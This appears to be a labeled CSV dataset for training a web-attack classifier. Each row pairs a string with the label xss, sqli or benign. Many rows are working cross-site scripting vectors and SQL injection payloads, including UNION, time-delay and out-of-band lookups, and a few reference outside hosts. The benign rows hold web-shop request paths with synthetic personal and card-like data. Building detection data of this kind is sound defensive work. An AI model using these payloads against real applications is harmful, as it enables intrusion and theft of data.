payload,type
"<iframe %00 src=""&Tab;javascript:prompt(1)&Tab;""%00>",xss
imagenes/3.gif,benign
"<script src=""\\%(jscript)s""></script>",xss
index.jsp,benign
invo3unta6i5,benign
"<a href=""\x1Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
" <HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
"<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>",xss
"soc: select * from users where id='1' + @<@# union select 1,version() -- 1'",sqli
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",xss
"s):s: select * from users where id=1 or ""):"" or 1=1 -- 1",sqli
&no.&: select * from users where id=1 or $<\. or 1=1 -- 1,sqli
"<div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>​",xss
tiedeman,benign
imagenes/logo.gif,benign
imagenes/logo.gif,benign
global/titulo.jsp,benign
ribera d'ondara,benign
publico/carrito.jsp,benign
a' and '456'='678,sqli
35210254z,benign
"UEov,: select * from users where id=1 union select !<@,version() -- 1",sqli
"<body onPageShow body onPageShow=""javascript:javascript:alert(1)""></body onPageShow>",xss
ayoroa,benign
456'%5d|//a|/a%5b'a,sqli
publico/caracteristicas.jsp?id=2,benign
imagenes/3.gif,benign
sonn&: select * from users where id='1' <@$_ or 1=1 -- 1',sqli
imagenes/nuestratierra.jpg,benign
"<body onPropertyChange body onPropertyChange=""javascript:javascript:alert(1)""></body onPropertyChange>",xss
publico/miembros.jsp,benign
coderch gordo,benign
"<body onMouseMove body onMouseMove=""javascript:javascript:alert(1)""></body onMouseMove>",xss
') or ('x')=('x,sqli
global/creditos.jsp,benign
<script>+-+-1-+-+alert(1)</script>,xss
"s({s: select * from users where id=1 or ""({"" or 1=1 -- 1",sqli
"1' or benchmark(100000000,MD5(1))#",sqli
&o1&1: select * from users where id=1 or \<1 or 1=1 -- 1,sqli
a' or 'dfth'='dfth'-- #,sqli
subidor,benign
publico/pagar.jsp?modo=insertar&precio=1998&B1=Confirmar,benign
"`""'><img src=xxx:x \x0Bonerror=javascript:alert(1)>",xss
admin' or '1'='1,sqli
"""`'><script>-javascript:alert(1)</script>",xss
painter.stovin@tetdevelocidad.bn,benign
'*',sqli
"so1UE: select * from users where id='1' *1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
global/creditos.jsp,benign
"<var onmouseover=""prompt(1)"">On Mouse Over</var>​",xss
<--`<img/src=` onerror=alert(1)> --!>,xss
"UEoov: select * from users where id=1 union select +!<@,version() -- 1",sqli
47172,benign
"admin"" or ""1""=""1""/*",sqli
imagenes/nuestratierra.jpg,benign
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss
"<? foo=""><script>javascript:alert(1)</script>"">",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
publico/productos.jsp,benign
3411,benign
"s1;s: select * from users where id=1 or ""1;""=1 or 1=1 -- 1",sqli
"<a href=""\xE2\x80\x82javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
so()&: select * from users where id='1' *(\) or 1=1 -- 1',sqli
or 1=1#,sqli
"s:s: select * from users where id='1' union select "":""_,version() -- 1'",sqli
"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,xss
a'and/*g*/456=678-- #,sqli
"""`'><script>\xE2\x80\xA9javascript:alert(1)</script>",xss
<SCRIPT SRC=%(jscript)s?<B>,xss
"<BGSOUND SRC=""javascript:javascript:alert(1);"">",xss
"s,o1U: select * from users where id=1 or @#"",=1 union select 1,version() -- 1",sqli
"<DIV STYLE=""background-image: url(javascript:javascript:alert(1))"">",xss
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
"s;c: select * from users where id=1 or "";#"" or 1=1 -- 1",sqli
1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--,sqli
mcbrayne,benign
".UEvk: select * from users where id=1. union select null,banner from v$version where rownum=1 -- 1",sqli
oov&1: select * from users where id=1 %!<@ or 1=1 -- 1,sqli
publico/carrito.jsp,benign
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",xss
"<STYLE TYPE=""text/javascript"">javascript:alert(1);</STYLE>",xss
a' and '456'='678,sqli
"<script>if(""x\\xE0\xB9\x92"".length==2) { javascript:alert(1);}</script>",xss
&noo&: select * from users where id=1 or $+<\ or 1=1 -- 1,sqli
miembros/editar.jsp?modo=registro&login=derbyshi&password=filen%3Fa&nombre=Anuar&apellidos=Cruselles+Varela&email=jane%4023horas.ua&dni=95001516Q&direccion=Muelle+Evaristo+Churruca%2C+149+5%3FE&ciudad=Friera+de+Valverde&cp=50133&provincia=Salamanca&ntc=5389852449679105&B1=Registrar,benign
"s,UEs: select * from users where id=1 or 1#"", union select 'a',version() -- 1",sqli
"<a href=""\xE2\x80\x86javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
1)&1c: select * from users where id=1 +(1) or 1=1 -- 1,sqli
admin') or '1'='1'/*,sqli
heile,benign
"s?.s: select * from users where id=1 or ""]."" or 1=1 -- 1",sqli
1); waitfor delay '0:0:X'--,sqli
"s.UEf: select * from users where id=1 or 1#"". union select version(),version() -- 1",sqli
"ABC<div style=""x:\xE2\x80\x82expression(javascript:alert(1)"">DEF",xss
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
o(1)&: select * from users where id=1 %(1) or 1=1 -- 1,sqli
"<a href=""\xE2\x80\x83javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"456"")%5d|//a|/a%5bcontains(a,""b",sqli
2 order by 1,sqli
\x3Cscript>javascript:alert(1)</script>,xss
"&o.UE: select * from users where id=1 or \<\. union select 1,@@VERSION -- 1",sqli
"<a href=""\x0Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
a' and 'fghi'='fghj'--,sqli
"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>",xss
publico/productos.jsp,benign
"s{o1U: select * from users where id=1 or @#""{=1 union select 1,version() -- 1",sqli
ac6di9o,benign
admin'/*,sqli
12480,benign
"<a href=""\xE2\x80\x87javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
noo&1: select * from users where id=1 + $+%\ or 1=1 -- 1,sqli
"ABC<div style=""x:\xE2\x80\x83expression(javascript:alert(1)"">DEF",xss
"s:n: select * from users where id=1 or "":["" or 1=1 -- 1",sqli
"""`'><script>\x0Ajavascript:alert(1)</script>",xss
"<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1)""></title onPropertyChange>",xss
"<IFRAME SRC=""javascript:javascript:alert(1);""></IFRAME>",xss
"""`'><script>\x2Bjavascript:alert(1)</script>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,benign
 ,sqli
global/titulo.jsp,benign
gussack.reinecke@eddydaniele.pt,benign
calle gurugu 142 4?d,benign
8470,benign
danis,benign
"<! foo=""[[[Inception]]""><x foo=""]foo><script>javascript:alert(1)</script>"">",xss
"&voo1: select * from users where id=1 or @<@=1 union select 1,version() -- 1",sqli
celfa,benign
1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--,sqli
&no&1: select * from users where id=1 or $<\ or 1=1 -- 1,sqli
admin') or '1'='1'--,sqli
"s\c: select * from users where id=1 or ""\#"" or 1=1 -- 1",sqli
stadler_munks@chevrolet-volt.at,benign
"""`'><script>\x20javascript:alert(1)</script>",xss
"<script>if(""x\\xE1\x96\x89"".length==2) { javascript:alert(1);}</script>",xss
feutlins,benign
"s;o1&: select * from users where id=1 or @#"";=1 or 1=1 -- 1",sqli
"s?(s: select * from users where id=1 or ""?("" or 1=1 -- 1",sqli
"UE(1): select * from users where id=1 union select (1),banner from v$version where rownum=1 -- 1",sqli
"s.)s: select * from users where id=1 or "".)"" or 1=1 -- 1",sqli
"s(ns: select * from users where id=1 or ""(_"" or 1=1 -- 1",sqli
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=90&B1=A%F1adir+al+carrito,benign
publico/productos.jsp,benign
"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
-,sqli
"sUEnn: select * from users where id='1' union select $ _,@@VERSION -- 1'",sqli
"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>",xss
global/menum.jsp,benign
"""`'><script>\x09javascript:alert(1)</script>",xss
"<a href=""\x16javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<xml onPropertyChange xml onPropertyChange=""javascript:javascript:alert(1)""></xml onPropertyChange>",xss
imagenes/cmenbul.gif,benign
"s,UE1: select * from users where id=1 or 1#"", union select 1,version() -- 1",sqli
global/estilos.css,benign
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",xss
leiding@ubuybetter.cat,benign
"sUE&o: select * from users where id='1' union select ||/1,version() -- 1'",sqli
"s(,s: select * from users where id=1 or ""(,""=1 or 1=1 -- 1",sqli
"s..s: select * from users where id=1 or ""..""=1 or 1=1 -- 1",sqli
"s;UE1: select * from users where id=1 or 1#""; union select 1,version() -- 1",sqli
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,xss
miembros/editar.jsp?modo=registro&login=hoyer&password=poli8%E1l2a&nombre=Gema&apellidos=Magriny%E0&email=delaune%40tintasultravioleta.io&dni=08806627L&direccion=Av.+De+La+Reina+Sofia+151+&ciudad=Poboleda&cp=43700&provincia=Guadalajara&ntc=3288111380573813&B1=Registrar,benign
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",xss
"sn)s: select * from users where id=1 or ""_)"" or 1=1 -- 1",sqli
miembros/imagenes/castro.jpg,benign
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
imagenes/logo.gif,benign
global/estilos.css,benign
no&1c: select * from users where id=1 +$+ or 1=1 -- 1,sqli
" or x""=""x",sqli
"molinos, los",benign
imagenes/1.gif,benign
"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a",xss
belva,benign
"""`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>",xss
"<FRAMESET><FRAME SRC=""javascript:javascript:alert(1);""></FRAMESET>",xss
admin' or '1'='1'#,sqli
50645313a,benign
global/titulo.jsp,benign
"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
global/creditos.jsp,benign
"s,UEf: select * from users where id=1 or 1#"", union select version(),version() -- 1",sqli
"<img src=""javascript:alert(1)"">",xss
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",xss
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,xss
"<a href=""jav&#65ascript:javascript:alert(1)"">test1</a>",xss
a' or 'dfth'='dfth'#,sqli
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">​",xss
<script itworksinallbrowsers>/*<script* */alert(1)</script ​,xss
madgett,benign
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",xss
"s.UE1: select * from users where id=1 or 1#"". union select 1,version() -- 1",sqli
')) or (('x'))=(('x,sqli
40560,benign
son1&: select * from users where id='1' *$ 1 or 1=1 -- 1',sqli
"s?ns: select * from users where id=1 or ""?_"" or 1=1 -- 1",sqli
&1oo&: select * from users where id=1 or \+<\ or 1=1 -- 1,sqli
"<a href=""\xE1\x9A\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
6.27E+15,benign
"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",xss
"<video><source onerror=""javascript:javascript:alert(1)"">",xss
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script",xss
"admin"") or ""1""=""1""--",sqli
global/creditos.jsp,benign
22390,benign
